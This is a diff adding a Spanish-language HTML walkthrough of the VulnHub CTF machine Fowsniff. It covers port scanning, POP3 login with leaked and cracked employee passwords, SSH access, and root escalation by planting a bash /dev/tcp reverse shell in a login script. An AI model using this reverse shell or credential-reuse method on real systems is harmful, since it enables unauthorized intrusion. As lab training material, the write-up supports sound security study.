@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Writeup: Fowsniff</title>
+<link rel="stylesheet" href="../styles.css">
+<style>
+.code-block{position:relative;background:var(--bg-soft);border:1px solid var(--border);border-radius:6px;margin:1rem 0}
+.code-block pre{margin:0;padding:.9rem;overflow-x:auto;white-space:pre-wrap}
+.copy-btn{position:absolute;top:8px;right:8px;background:var(--bg);color:var(--accent);border:1px solid var(--border);border-radius:4px;padding:.25rem .55rem;font-size:.8rem;cursor:pointer}
+.screenshot-placeholder{padding:1rem;border:1px dashed var(--border);border-radius:6px;text-align:center;opacity:.8}
+</style>
+</head>
+<body>
+<main class="container">
+
+<section class="card"><img src="img/fowsniff_machine.png" alt="Máquina Fowsniff" class="machine-img"></section>
+
+<section class="card" style="text-align:center;margin-top:2rem;">
+<button class="nav-btn" onclick="history.back()">⬅ Volver</button>
+<button class="nav-btn" onclick="window.print()">⬇ Descargar PDF</button>
+<button class="nav-btn" onclick="likePost()">👍 Me gusta <span id="like-count">0</span></button>
+</section>
+
+<section class="card">
+<h2>Fowsniff</h2>
+<p class="post-desc">Plataforma: VulnHub · Dificultad: Fácil · Fecha: Agosto 2026</p>
+<ul class="post-tags">
+<li>#VulnHub</li><li>#fowsniff</li><li>#ssh</li><li>#http</li><li>#pop3</li><li>#imap</li>
+<li>#enumeracion</li><li>#fuzzing</li><li>#leak</li><li>#mail</li><li>#Hacktricks</li><li>#kernel</li><li>#grupos</li>
+</ul>
+</section>
+
+<section class="card">
+<h3>Reconocimiento</h3>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copiar</button><pre><code>sudo arp-scan -I eth0 --localnet --ignoredups</code></pre></div>
+<p>IP de la máquina víctima:</p>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copiar</button><pre><code>192.168.1.102</code></pre></div>
+<p>Una vez obtenida la <strong>IP</strong>, vamos a realizar un escaneo para determinar los puertos abiertos.</p>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copiar</button><pre><code>nmap -p- --open 192.168.1.102 -sS -Pn -n --min-rate 5000 -vvv -oG allPorts</code></pre></div>
+<p>El output del escaneo lo guardamos en formato grepeable en el archivo <code>allPorts</code> y con la utilidad <code>extractPorts</code> lo extraemos. Este es el resultado:</p>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copiar</button><pre><code>extractPorts allPorts
+
+[*] Extracting information...
+
+    [*] IP Address: 192.168.43.6
+    [*] Open ports: 22,80,110,143
+
+[*] Ports copied to clipboard</code></pre></div>
+<p>Los puertos que fueron encontrados abiertos:</p>
+<ul><li>22 → <code>SSH</code></li><li>80 → <code>HTTP</code></li><li>110 → <code>POP3</code></li><li>143 → <code>IMAP</code></li></ul>
+</section>
+
+<section class="card">
+<h3>Hacktricks</h3>
+<p><code>POP3</code> permite que un cliente se autentique en un buzón de correo, enumere y recupere mensajes, marque opcionalmente mensajes para su eliminación y confirme dichas eliminaciones tras un <code>QUIT</code> exitoso. La descarga no elimina inherentemente todos los mensajes; la configuración del cliente determina si se emite <code>DELE</code>.</p>
+<p><code>IMAP</code> le permite acceder a su correo electrónico desde cualquier lugar y desde cualquier dispositivo. Cuando lee un mensaje de correo electrónico mediante IMAP, en realidad no lo descarga ni almacena en el equipo; en su lugar, lo está leyendo en el servicio de correo electrónico.</p>
+<p>Esta es una lista de comandos que se pueden usar dentro de <code>POP3</code>:</p>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copiar</button><pre><code>POP commands:
+
+USER uid           Log in as &quot;uid&quot;
+PASS password      Substitute &quot;password&quot; with your actual password
+STAT               List number of messages, total mailbox size
+LIST               List messages and sizes
+RETR n             Show message n
+DELE n             Mark message n for deletion
+RSET               Undo any changes
+QUIT               Logout (expunges messages if no RSET)
+TOP msg n          Show first n lines of message number msg
+CAPA               Get capabilities</code></pre></div>
+</section>
+
+<section class="card">
+<h3>Enumeración</h3>
+<p>Algo interesante es que el servicio de correo está expuesto. Podemos intentar conectarnos a este servicio usando el siguiente comando:</p>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copiar</button><pre><code>telnet 192.168.1.102 110
+
+o
+
+nc -nv 192.168.1.102 110</code></pre></div>
+<p>Una vez conectados, hay una serie de comandos que podemos usar para listar mensajes y contenido en el servicio:</p>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copiar</button><pre><code>list -&gt; listar
+user test -&gt; para logearnos como dicho usuario
+pass password -&gt; para ingresar la password de dicho usuario</code></pre></div>
+<p>Pero no se nos permite ejecutar dichos comandos de <code>listar</code> porque no tenemos los permisos necesarios, por lo que necesitamos credenciales para logearnos en el servicio y así poder listar el contenido de algún usuario.</p>
+<p>Vamos a ingresar a la web en busca de cualquier información o posible vulnerabilidad.</p>
+<p class="screenshot-placeholder"><section class="card"><img src="img/fowweb.png" alt="Maquina Fowsniff" class="machine-img"/></section></p>
+<p>Una vez dentro de la web, vemos un mensaje de la empresa explicando que la empresa sufrió un hackeo y que el atacante robó información de los empleados, como sus <code>correos</code> y <code>passwords</code>. También indican que están mejorando la seguridad y que, además, el atacante se hizo con la cuenta de <code>Twitter</code> <code>@fowsniff</code> de la empresa, desde donde puede difundir esa información, por lo que piden estar al tanto de la situación.</p>
+<p class="screenshot-placeholder"><section class="card"><img src="img/machine_fowsniff.png" alt="Maquina Fowsniff" class="machine-img"/></section></p>
+<p>Si realizamos <strong>fuzzing</strong> de directorios en la web, encontramos varios archivos y directorios, pero el más interesante es <code>security.txt</code>, donde el atacante deja un mensaje refiriéndose a las malas prácticas de seguridad de la empresa:</p>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copiar</button><pre><code>       WHAT SECURITY?
+
+            &#x27;&#x27;~``
+
+           ( o o )
+
++-----.oooO--(_)--Oooo.------+
+
+|                            |
+
+|          FOWSNIFF          |
+
+|            got             |
+
+|           PWN3D!!!         |
+
+|                            |
+
+|       .oooO                |
+
+|        (   )   Oooo.       |
+
++---------\ (----(   )-------+
+
+           \_)    ) /
+
+                 (_/
+
+Fowsniff Corp got pwn3d by B1gN1nj4!
+
+No one is safe from my 1337 skillz!</code></pre></div>
+<p>Además de esto, no se encontró nada más interesante, por lo que fui a <code>Twitter</code> en busca de cualquier información filtrada por el atacante que se hizo con la cuenta.</p>
+<p>Una vez dentro de la cuenta podemos ver muchos mensajes de burla hacia la empresa y una credencial que dice ser del <code>admin</code>:</p>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copiar</button><pre><code>stone@fowsniff:92b8a29ef1183192e3d35187e0cfabd</code></pre></div>
+<p>Ese hash intenté crackearlo en <code>hashes.com</code>, pero no fue posible, por lo que seguí buscando en la cuenta de Twitter y el atacante compartió un <code>Pastebin</code> ya obsoleto. Posteriormente, se encontró una cuenta de <strong>GitHub</strong> de Fowsniff donde se compartieron las credenciales robadas de la empresa:</p>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copiar</button><pre><code>mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
+mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
+tegel@fowsniff:1dc352435fecca338acfd4be10984009
+baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
+seina@fowsniff:90dc16d47114aa13671c697fd506cf26
+stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
+mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
+parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
+sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e</code></pre></div>
+<p>Todas esas passwords las ingresamos en <code>hashes.com</code> y fueron crackeadas con éxito:</p>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copiar</button><pre><code>0e9588cb62f4b6f27e33d449e2ba0b3b:carp4ever
+19f5af754c31f1e2651edde9250d69bb:skyler22
+1dc352435fecca338acfd4be10984009:apples01
+4d6e42f56e127803285a0a7649b5ab11:orlando12
+8a28a94a588a95b80163709ab4313aa4:mailcall
+90dc16d47114aa13671c697fd506cf26:scoobydoo2
+ae1644dac5b77c0cf51e0d26ad6d7e56:bilbo101
+f7fd98d380735e859f8b2ffbbede5a7e:07011972</code></pre></div>
+<p>Con los usuarios y las credenciales probé en el servicio de correo hasta que hallé una válida ;):</p>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copiar</button><pre><code>telnet 192.168.1.102 110
+
+seina:scoobydoo2</code></pre></div><div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copiar</button><pre><code>user seina
+pass soobydoo2</code></pre></div>
+<p>Una vez logeado podemos listar los mensajes de este usuario con el comando:</p>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copiar</button><pre><code>list</code></pre></div>
+<p>Tenemos 2 correos identificados como 1 y 2.</p>
+<p>Vamos a ver el contenido de cada uno de estos correos usando:</p>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copiar</button><pre><code>retr 1
+
+retr 2</code></pre></div>
+</section>
+
+<section class="card">
+<h3>📧 1</h3>
+<p>El correo número 1, en resumen, es el correo del admin explicando la situación de la empresa debido a la brecha de seguridad y recomendando el cambio de password a cada usuario. La parte más importante es que da a conocer la nueva password para conectarse por <code>SSH</code> al servidor. Además, dice que cada usuario debe cambiar la password inmediatamente, por lo que podemos suponer que habrá usuarios que ya hayan cambiado la password. La password es: <code>S1ck3nBluff+secureshell</code>.</p>
+</section>
+
+<section class="card">
+<h3>📧 2</h3>
+<p>El correo número 2 se trata de un usuario de la empresa cuyas credenciales del correo también fueron filtradas, pero realizó ya el cambio de las <strong>credenciales de correo</strong>. Se comunica con Seina para saber su situación actual y si sabe lo ocurrido con la empresa, ya que está de vacaciones (motivo por el que no cambió su password de correo). Este usuario, <code>baksteen</code>, si usamos su usuario y la password de SSH nos podemos conectar al servidor.</p>
+</section>
+
+<section class="card">
+<h3>Escalada de Privilegios</h3>
+<p>Una vez dentro, ahora vamos a buscar la manera de escalar privilegios.</p>
+<p>En este caso yo probé de 2 maneras y las dos son funcionales. Vamos por la primera y muy sencilla:</p>
+<h4>Kernel</h4>
+<p>La versión del kernel para esa versión de <code>Ubuntu 16.04</code> tiene CVE, el cual no lo menciono para que hagan la búsqueda. Usando ese exploit y ejecutándolo en la máquina te da una shell como <code>root</code>. Así de fácil.</p>
+<p>Ahora la segunda. Si usamos el comando:</p>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copiar</button><pre><code>id</code></pre></div>
+<p>Vemos que nuestro usuario <code>baksteen</code> pertenece a un grupo llamado <code>users</code>, un grupo diferente de lo habitual.</p>
+<p>Si buscamos archivos donde como grupo pertenecen al grupo <code>users</code>:</p>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copiar</button><pre><code>find / -group users -type f 2&gt;/dev/null</code></pre></div>
+<p>Encontramos un archivo curioso:</p>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copiar</button><pre><code>/opt/cube/cube.sh
+
+ls -l /opt/cube/cube.sh</code></pre></div>
+<p>Vemos que los usuarios que pertenecen a este grupo tienen todos los permisos. Si vemos el contenido del archivo, vemos que es el panel de bienvenida que nos aparece cuando ingresamos por primera vez en la máquina, es decir, cuando nos logeamos.</p>
+<p>El propietario del archivo es el usuario actual <code>baksteen</code>, pero, si te percatas, el script solo muestra ese panel de administración. O sea, algún script, tarea o servicio programado debe encargarse de hacer la llamada a este script para mostrar un panel una vez nos logueamos, a no ser que este contenido esté duplicado en ese otro script.</p>
+<p>Pero si usan otro script para llamar al panel, entonces, si modificamos el contenido de este script para lanzar una <strong>Reverse Shell</strong> cuando el usuario que llame a este script desde otro proceso no sea mi usuario actual y sea root, por ejemplo, el que ejecuta el script, entonces, una vez haga el llamado, se ejecutará como root la reverse shell y se enviará al atacante.</p>
+<p>O sea, en resumen:</p>
+<p class="screenshot-placeholder"><section class="card"><img src="img/fowsinff.png" alt="Maquina Fowsniff" class="machine-img"/></p>
+<p>Dentro de <code>cube.sh</code>:</p>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copiar</button><pre><code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/puerto 0&gt;&amp;1&quot;</code></pre></div>
+<p>Una vez guardado el cambio salimos de sesión y entramos otra vez por SSH.</p>
+<p>Pero antes tenemos que ponernos en escucha de nuestro lado:</p>
+<div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copiar</button><pre><code>nc -lvnp 446</code></pre></div><div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copiar</button><pre><code>ssh baksteen@192.168.1.102 -p 22</code></pre></div>
+<p>De esta manera obtenemos una shell como root y listo.</p>
+</section>
+
+<section class="card" style="margin-top:2rem;">
+<h3>Comentarios</h3>
+<textarea id="comment-input" placeholder="Escribe tu comentario..." class="comment-box"></textarea><br><br>
+<button class="nav-btn" onclick="addComment()">Enviar comentario</button>
+<ul id="comment-list" style="margin-top:1rem;text-align:left;"></ul>
+</section>
+
+<script>
+let likes=parseInt(localStorage.getItem("likes")||"0");
+document.getElementById("like-count").textContent=likes;
+function likePost(){likes++;document.getElementById("like-count").textContent=likes;localStorage.setItem("likes",likes);}
+function copyCode(btn){navigator.clipboard.writeText(btn.parentElement.querySelector("code").innerText);btn.textContent="Copiado";setTimeout(()=>btn.textContent="Copiar",1200);}
+function addComment(){const input=document.getElementById("comment-input"),text=input.value.trim();if(text){const li=document.createElement("li");li.textContent=text;document.getElementById("comment-list").appendChild(li);let comments=JSON.parse(localStorage.getItem("comments")||"[]");comments.push(text);localStorage.setItem("comments",JSON.stringify(comments));input.value="";}}
+window.onload=()=>{JSON.parse(localStorage.getItem("comments")||"[]").forEach(c=>{const li=document.createElement("li");li.textContent=c;document.getElementById("comment-list").appendChild(li);});};
+</script>
+</main>
+</body>
+</html>
